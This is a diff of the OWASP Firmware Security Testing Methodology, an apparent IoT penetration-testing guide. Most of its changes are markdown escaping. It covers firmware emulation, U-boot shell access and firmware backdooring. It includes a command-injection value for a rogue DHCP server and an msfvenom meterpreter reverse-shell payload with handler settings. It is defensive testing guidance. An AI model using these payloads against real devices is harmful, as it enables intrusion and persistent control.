 Sometimes, requests are dispatched to the CGI binary by the HTTP server. By simply emulating the CGI binary, it's possible to analyze the process procedure or verify the vulnerability without setting up a HTTP server. The following example issues a GET request to a MIPS CGI binary.
 
 ```
-~/DIR850L/squashfs-root/htdocs/web$ ls -l captcha.cgi
+\~/DIR850L/squashfs-root/htdocs/web$ ls -l captcha.cgi
 lrwxrwxrwx 1 root root     14 Oct 17  2017 captcha.cgi -> /htdocs/cgibin
 
 # fix the broken symbolic link
-~/DIR850L/squashfs-root/htdocs/web$ rm captcha.cgi && ln -s ../cgibin captcha.cgi
+\~/DIR850L/squashfs-root/htdocs/web$ rm captcha.cgi \&\& ln -s ../cgibin captcha.cgi
 
-~/DIR850L/squashfs-root$ sudo chroot . ./qemu-mips-static -E REQUEST_METHOD="GET" -E REQUEST_URI="/captcha.cgi" -E REMOTE_ADDR="192.168.1.1" -E CONTENT_TYPE="text/html" /htdocs/web/captcha.cgi
+\~/DIR850L/squashfs-root$ sudo chroot . ./qemu-mips-static -E REQUEST\_METHOD="GET" -E REQUEST\_URI="/captcha.cgi" -E REMOTE\_ADDR="192.168.1.1" -E CONTENT\_TYPE="text/html" /htdocs/web/captcha.cgi
 HTTP/1.1 200 OK
 Content-Type: text/xml
 
@@ -728,53 +748,53 @@ With the target binary emulated, interact with its interpreter or listening serv
 
 When possible, use automation tools such as firmadyne, firmware analysis toolkit, or ARM-X Firmware Emulation Framework to perform full emulation of firmware. These tools are essentially wrappers for QEMU and other environmental functions such as nvram.
 
-* <https://github.com/attify/firmware-analysis-toolkit>
-* <https://github.com/therealsaumil/armx/>
-* <https://github.com/getCUJO/MIPS-X>
-* <https://github.com/firmadyne/firmadyne>
-* <https://github.com/qilingframework/qiling#qltool>
+* [https://github.com/attify/firmware-analysis-toolkit](https://github.com/attify/firmware-analysis-toolkit)
+* [https://github.com/therealsaumil/armx/](https://github.com/therealsaumil/armx/)
+* [https://github.com/getCUJO/MIPS-X](https://github.com/getCUJO/MIPS-X)
+* [https://github.com/firmadyne/firmadyne](https://github.com/firmadyne/firmadyne)
+* [https://github.com/qilingframework/qiling#qltool](https://github.com/qilingframework/qiling#qltool)
 
 Using firmware analysis toolkit, simply execute the following command:
 
 ```
 sudo python3 ./fat.py IoTGoat-rpi-2.img --qemu 2.5.0 
 
-                               __           _
-                              / _|         | |
-                             | |_    __ _  | |_
-                             |  _|  / _` | | __|
-                             | |   | (_| | | |_
-                             |_|    \__,_|  \__|
+                               \_\_           \_
+                              / \_|         | |
+                             | |\_    \_\_ \_  | |\_
+                             |  \_|  / \_` | | \_\_|
+                             | |   | (\_| | | |\_
+                             |\_|    \\\_\_,\_|  \\\_\_|
 
                 Welcome to the Firmware Analysis Toolkit - v0.3
     Offensive IoT Exploitation Training http://bit.do/offensiveiotexploitation
                   By Attify - https://attify.com  | @attifyme
 
-[+] Firmware: IoTGoat-rpi-2.img
-[+] Extracting the firmware...
-[+] Image ID: 1
-[+] Identifying architecture...
-[+] Architecture: armel
-[+] Building QEMU disk image...
-[+] Setting up the network connection, please standby...
-[+] Network interfaces: [('eth0', '192.168.1.1')]
-[...]
+\[+] Firmware: IoTGoat-rpi-2.img
+\[+] Extracting the firmware...
+\[+] Image ID: 1
+\[+] Identifying architecture...
+\[+] Architecture: armel
+\[+] Building QEMU disk image...
+\[+] Setting up the network connection, please standby...
+\[+] Network interfaces: \[('eth0', '192.168.1.1')]
+\[...]
 Adding route to 192.168.1.1...
 Starting firmware emulation... use Ctrl-a + x to exit
-[    0.000000] Booting Linux on physical CPU 0x0
-[    0.000000] Linux version 4.1.17+ (vagrant@vagrant-ubuntu-trusty-64) (gcc version 5.3.0 (GCC) ) #1 Thu Feb 18 01:05:21 UTC 2016
-[    0.000000] CPU: ARMv7 Processor [412fc0f1] revision 1 (ARMv7), cr=10c5387d
-[    0.000000] CPU: PIPT / VIPT nonaliasing data cache, PIPT instruction cache
+\[    0.000000] Booting Linux on physical CPU 0x0
+\[    0.000000] Linux version 4.1.17+ (vagrant@vagrant-ubuntu-trusty-64) (gcc version 5.3.0 (GCC) ) #1 Thu Feb 18 01:05:21 UTC 2016
+\[    0.000000] CPU: ARMv7 Processor \[412fc0f1] revision 1 (ARMv7), cr=10c5387d
+\[    0.000000] CPU: PIPT / VIPT nonaliasing data cache, PIPT instruction cache
 
 BusyBox v1.28.4 () built-in shell (ash)
 
-                                                           .--,\\\__         
- ██████╗ ██╗    ██╗ █████╗ ███████╗██████╗                  `-.    a`-.__    
+                                                           .--,\\\\\\\_\_         
+ ██████╗ ██╗    ██╗ █████╗ ███████╗██████╗                  `-.    a`-.\_\_    
 ██╔═══██╗██║    ██║██╔══██╗██╔════╝██╔══██╗                   |         ')   
-██║   ██║██║ █╗ ██║███████║███████╗██████╔╝                  / \ _.-'-,`;    
+██║   ██║██║ █╗ ██║███████║███████╗██████╔╝                  / \\ \_.-'-,`;    
 ██║   ██║██║███╗██║██╔══██║╚════██║██╔═══╝                  /     |   { /    
 ╚██████╔╝╚███╔███╔╝██║  ██║███████║██║                      /     |   { /    
- ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═╝╚══════╝╚═╝            ..-"``~"-'      ;    )     
+ ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═╝╚══════╝╚═╝            ..-"``\~"-'      ;    )     
                                            ╦┌─┐╔╦╗╔═╗┌─┐┌─┐┌┬┐   ;'    `     
                                            ║│ │ ║ ║ ╦│ │├─┤ │   ;'    `      
                                            ╩└─┘ ╩ ╚═╝└─┘┴ ┴ ┴  ;'    `       
@@ -813,6 +833,7 @@ Specific areas to review within an embedded device’s web application are the f
 * Perform directory traversal and content discovery on web pages to identify debug or testing functionality
 * Asses SOAP/XML and API communication for input validation and sanitization vulnerabilities such as XSS and XXE
 * Fuzz application parameters and observe exceptions and stack traces
+
   * Tailor targeted payloads against embedded web application services for common C/C++ vulnerabilities such as memory corruption vulnerabilities, format string flaws, and integer overflows.
 
 Depending on the product and its application interfaces, test cases will differ.
@@ -823,12 +844,14 @@ When modifying device start up and bootloaders such as U-boot, attempt the follo
 
 * Attempt to access the bootloaders interpreter shell by pressing "0", space or other identified “magic codes” during boot.
 * Modify configurations to execute a shell command such as adding '`init=/bin/sh`' at the end of boot arguments
+
   * `#printenv`
   * `#setenv bootargs=console=ttyS0,115200 mem=63M root=/dev/mtdblock3`
   * `mtdparts=sflash:<partitiionInfo> rootfstype=<fstype> hasEeprom=0 5srst=0 int=/bin/sh`
   * `#saveenv`
   * `#boot`
 * Setup a tftp server to load images over the network locally from your workstation. Ensure the device has network access.
+
   * `#setenv ipaddr 192.168.2.2 #local IP of the device`
   * `#setenv serverip 192.168.2.1 #tftp server IP`
   * `#saveenv`
@@ -837,13 +860,16 @@ When modifying device start up and bootloaders such as U-boot, attempt the follo
   * `#tftp ${loadaddr} uImage-3.6.35 #loadaddr takes two arguments: the address to load the file into and the filename of the image on the TFTP server`
 * Use `ubootwrite.py` to write the uboot-image and push a modified firmware to gain root
 * Check for enabled debug features such as:
+
   * verbose logging
   * loading arbitrary kernels
   * booting from untrusted sources
 * \*Use caution: Connect one pin to ground, watch device boot up sequence, before the kernel decompresses, short/connect the grounded pin to a data pin (DO) on an SPI flash chip
 * \*Use caution: Connect one pin to ground, watch device boot up sequence, before the kernel decompresses, short/connect the grounded pin to pins 8 and 9 of the NAND flash chip at the moment U-boot decompresses the UBI image
+
   * \*Review the NAND flash chip’s datasheet prior to shorting pins
 * Configure a rogue DHCP server with malicious parameters as input for a device to ingest during a PXE boot
+
   * Use Metasploit’s (MSF) DHCP auxiliary server and modify the ‘`FILENAME`’ parameter with command injection commands such as `‘a";/bin/sh;#’` to test input validation for device startup procedures.
 
 \*Hardware security testing
@@ -863,15 +889,16 @@ Attempt to upload custom firmware and/or compiled binaries for integrity or sign
 9. Remove QEMU binary from extracted firmware rootfs
 10. Repackage the modified firmware with FMK
 11. Test backdoored firmware by emulating with firmware analysis toolkit (FAT) and connecting to the target backdoor IP and port using netcat
-12.
+12. 
 
 If a root shell has already been obtained from dynamic analysis, bootloader manipulation, or hardware security testing means, attempt to execute precompiled malicious binaries such as implants or reverse shells. Consider using automated payload/implant tools used for command and control (C\&C) frameworks. For example, Metasploit framework and ‘msfvenom’ can be leveraged using the following steps.
 
 1. Identify the target firmware architecture and endianness
-2. Use `msfvenom` to specify the appropriate target payload (-p), attacker host IP (LHOST=), listening port number (LPORT=) filetype (-f), architecture (--arch), platform (--platform linux or windows), and the output file (-o). For example, `msfvenom -p linux/armle/meterpreter_reverse_tcp LHOST=192.168.1.245 LPORT=4445 -f elf -o meterpreter_reverse_tcp --arch armle --platform linux`
+2. Use `msfvenom` to specify the appropriate target payload (-p), attacker host IP (LHOST=), listening port number (LPORT=) filetype (-f), architecture (--arch), platform (--platform linux or windows), and the output file (-o). For example, `msfvenom -p linux/armle/meterpreter\_reverse\_tcp LHOST=192.168.1.245 LPORT=4445 -f elf -o meterpreter\_reverse\_tcp --arch armle --platform linux`
 3. Transfer the payload to the compromised device (e.g. Run a local webserver and wget/curl the payload to the filesystem) and ensure the payload has execution permissions
 4. Prepare Metasploit to handle incoming requests. For example, start Metasploit with msfconsole and use the following settings according to the payload above: use exploit/multi/handler,
-   * `set payload linux/armle/meterpreter_reverse_tcp`
+
+   * `set payload linux/armle/meterpreter\_reverse\_tcp`
    * `set LHOST 192.168.1.245 #attacker host IP`
    * `set LPORT 445 #can be any unused port`
    * `set ExitOnSession false`
@@ -879,7 +906,7 @@ If a root shell has already been obtained from dynamic analysis, bootloader mani
 5. Execute the meterpreter reverse 🐚 on the compromised device
 6. Watch meterpreter sessions open
 7. Perform post exploitation activities
-8.
+8. 
 
 If possible, identify a vulnerability within startup scripts to obtain persistent access to a device across reboots. Such vulnerabilities arise when startup scripts reference, [symbolically link](https://www.chromium.org/chromium-os/chromiumos-design-docs/hardening-against-malicious-stateful-data), or depend on code located in untrusted mounted locations such as SD cards, and flash volumes used for storage data outside of root filesystems.
 
@@ -887,7 +914,7 @@ If possible, identify a vulnerability within startup scripts to obtain persisten
 
 Runtime analysis involves attaching to a running process or binary while a device is running in its normal or emulated environment. Basic runtime analysis steps are provided below:
 
-1. `sudo chroot . ./qemu-arch -L <optionalLibPath> -g <gdb_port> <binary>`
+1. `sudo chroot . ./qemu-arch -L <optionalLibPath> -g <gdb\_port> <binary>`
 2. Attach gdb-multiarch or use a disassembler to emulate the binary
 3. Set breakpoints for functions identified during step 4 such as memcpy, strncpy, strcmp, etc.
 4. Execute large payload strings to identify overflows or process crashes using a fuzzer
@@ -932,12 +959,12 @@ These tools provide professional-grade reverse engineering capabilities without 
 
 After identifying a vulnerability within a binary from previous steps, a proper proof-of-concept (PoC) is required to demonstrate the real-world impact and risk. Developing exploit code requires programming experience in lower level languages (e.g. ASM, C/C++, shellcode, etc.) as well as background within the particular target architecture (e.g. MIPS, ARM, x86 etc.). PoC code involves obtaining arbitrary execution on a device or application by controlling an instruction in memory.
 
-It is not common for binary runtime protections (e.g. NX, DEP, ASLR, etc.) to be in place within embedded systems however when this happens, additional techniques may be required such as return oriented programming (ROP). ROP allows an attacker to implement arbitrary malicious functionality by chaining existing code in the target process/binary's code known as gadgets. Steps will need to be taken to exploit an identified vulnerability such as a buffer overflow by forming a ROP chain. A tool that can be useful for situations like these is Capstone's gadget finder or ROPGadget- <https://github.com/JonathanSalwan/ROPgadget>.
+It is not common for binary runtime protections (e.g. NX, DEP, ASLR, etc.) to be in place within embedded systems however when this happens, additional techniques may be required such as return oriented programming (ROP). ROP allows an attacker to implement arbitrary malicious functionality by chaining existing code in the target process/binary's code known as gadgets. Steps will need to be taken to exploit an identified vulnerability such as a buffer overflow by forming a ROP chain. A tool that can be useful for situations like these is Capstone's gadget finder or ROPGadget- [https://github.com/JonathanSalwan/ROPgadget](https://github.com/JonathanSalwan/ROPgadget).
 
 Utilize the following references for further guidance:
 
-* <https://azeria-labs.com/writing-arm-shellcode/>
-* <https://www.corelan.be/index.php/category/security/exploit-writing-tutorials/>
+* [https://azeria-labs.com/writing-arm-shellcode/](https://azeria-labs.com/writing-arm-shellcode/)
+* [https://www.corelan.be/index.php/category/security/exploit-writing-tutorials/](https://www.corelan.be/index.php/category/security/exploit-writing-tutorials/)
 
 ### **Integrating FSTM with OWASP IoT Security Frameworks**
 
@@ -973,7 +1000,7 @@ The ISTG firmware component (**ISTG-FW**) includes test cases that align with FS
 * Information Gathering - Source code disclosure, binaries, implementation details (aligns with FSTM Stage 1)
 * Configuration and Patch Management - Outdated software, unnecessary functionality (aligns with FSTM Stage 5)
 * Secrets - Hardcoded credentials, unencrypted storage (aligns with FSTM Stage 5)
-* Cryptography - Weak algorithms, insecure implementations (aligns with FSTM Stages 5 & 8)
+* Cryptography - Weak algorithms, insecure implementations (aligns with FSTM Stages 5 \& 8)
 * Firmware Update Mechanism (**ISTG-FW\[UPDT]**) - Secure OTA updates, signature verification
 * Installed Firmware (**ISTG-FW\[INST]**) - Runtime firmware security (aligns with FSTM Stage 8)
 
@@ -1003,14 +1030,14 @@ The [OWASP IoT Security Verification Standard (ISVS)](https://github.com/OWASP/I
 
 **Mapping ISVS V3 Requirements to FSTM Stages:**
 
-| ISVS Requirement              | FSTM Stage  | Testing Focus                                                              |
-| ----------------------------- | ----------- | -------------------------------------------------------------------------- |
-| V3.1 (SBOM)                   | Stage 5     | Verify SBOM generation from extracted filesystem (see EMBA SBOM analysis)  |
-| V3.2 (Third-party Components) | Stage 5     | Identify outdated libraries, vulnerable dependencies in extracted firmware |
-| V3.3 (Secure Communication)   | Stage 7     | Dynamic analysis of encrypted channels, certificate validation             |
-| V3.4 (Firmware Update)        | Stage 7     | Test OTA update mechanism security, signature verification                 |
-| V4.1 (Memory Protection)      | Stage 8     | Runtime analysis of ASLR, DEP, stack canaries in binary execution          |
-| V4.2 (Cryptography)           | Stage 5 & 8 | Static analysis of crypto implementations, runtime key storage validation  |
+|ISVS Requirement|FSTM Stage|Testing Focus|
+|-|-|-|
+|V3.1 (SBOM)|Stage 5|Verify SBOM generation from extracted filesystem (see EMBA SBOM analysis)|
+|V3.2 (Third-party Components)|Stage 5|Identify outdated libraries, vulnerable dependencies in extracted firmware|
+|V3.3 (Secure Communication)|Stage 7|Dynamic analysis of encrypted channels, certificate validation|
+|V3.4 (Firmware Update)|Stage 7|Test OTA update mechanism security, signature verification|
+|V4.1 (Memory Protection)|Stage 8|Runtime analysis of ASLR, DEP, stack canaries in binary execution|
+|V4.2 (Cryptography)|Stage 5 \& 8|Static analysis of crypto implementations, runtime key storage validation|
 
 **ISVS Security Levels and FSTM Testing Depth:**
 
@@ -1039,11 +1066,11 @@ Step 4: Provide remediation mapped to ISVS controls
 
 **Resources:**
 
-* OWASP ISVS: <https://github.com/OWASP/IoT-Security-Verification-Standard-ISVS>
-* OWASP ISTG: <https://owasp.org/owasp-istg/>
-* ISTG GitHub: <https://github.com/OWASP/owasp-istg>
-* ISTG Firmware Test Cases: <https://owasp.org/owasp-istg/03_test_cases/firmware/>
-* OWASP IoT Project: <https://owasp.org/www-project-internet-of-things/>
+* OWASP ISVS: [https://github.com/OWASP/IoT-Security-Verification-Standard-ISVS](https://github.com/OWASP/IoT-Security-Verification-Standard-ISVS)
+* OWASP ISTG: [https://owasp.org/owasp-istg/](https://owasp.org/owasp-istg/)
+* ISTG GitHub: [https://github.com/OWASP/owasp-istg](https://github.com/OWASP/owasp-istg)
+* ISTG Firmware Test Cases: [https://owasp.org/owasp-istg/03\_test\_cases/firmware/](https://owasp.org/owasp-istg/03_test_cases/firmware/)
+* OWASP IoT Project: [https://owasp.org/www-project-internet-of-things/](https://owasp.org/www-project-internet-of-things/)
 
 ### **Firmware and binary analysis tool index**
 
@@ -1084,28 +1111,35 @@ A combination of tools will be used throughout assessing firmware. Listed below,
 To practice discovering vulnerabilities in firmware, use the following vulnerable firmware projects as a starting point.
 
 * OWASP IoTGoat
-  * <https://github.com/OWASP/IoTGoat>
+
+  * [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
 * The Damn Vulnerable Router Firmware Project
-  * <https://github.com/praetorian-code/DVRF>
+
+  * [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
 * Damn Vulnerable ARM Router (DVAR)
-  * <https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html>
+
+  * [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
 * ARM-X
-  * <https://github.com/therealsaumil/armx#downloads>
+
+  * [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
 * Azeria Labs VM 2.0
-  * <https://azeria-labs.com/lab-vm-2-0/>
+
+  * [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
 * Damn Vulnerable IoT Device (DVID)
-  * <https://github.com/Vulcainreo/DVID>
+
+  * [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)
 
 **Feedback and contributing**
 
-If you would like to contribute or provide feedback to improve this methodology, contact <Aaron.guzman@owasp.org> ([@scriptingxss](https://twitter.com/scriptingxss?)). Make sure to open up an [issue](https://github.com/scriptingxss/owasp-fstm/issues) or a [pull request](https://github.com/scriptingxss/owasp-fstm/pulls), and we'll make sure to tend to it!
+If you would like to contribute or provide feedback to improve this methodology, contact [Aaron.guzman@owasp.org](mailto:Aaron.guzman@owasp.org) ([@scriptingxss](https://twitter.com/scriptingxss?)). Make sure to open up an [issue](https://github.com/scriptingxss/owasp-fstm/issues) or a [pull request](https://github.com/scriptingxss/owasp-fstm/pulls), and we'll make sure to tend to it!
 
 Special thanks to our sponsors Cisco Meraki, OWASP Inland Empire, and OWASP Los Angeles as well as José Alejandro Rivas Vidal for his careful review.
 
-The full list of contributors can be found via <https://github.com/scriptingxss/owasp-fstm/graphs/contributors>.
+The full list of contributors can be found via [https://github.com/scriptingxss/owasp-fstm/graphs/contributors](https://github.com/scriptingxss/owasp-fstm/graphs/contributors).
 
 **License**
 
 [Creative Commons Attribution Share Alike 4.0 International](https://github.com/scriptingxss/owasp-fstm/blob/master/License.md)
 
-![](/files/-M3i4PAnjQOKEOPVHo3x) ![](/files/-M3i4PAmlpv4ICGxlMCE) ![](/files/-M3i4PAlCiR4oTNn1Mdw)
+!\[](/files/-M3i4PAnjQOKEOPVHo3x) !\[](/files/-M3i4PAmlpv4ICGxlMCE) !\[](/files/-M3i4PAlCiR4oTNn1Mdw)
+
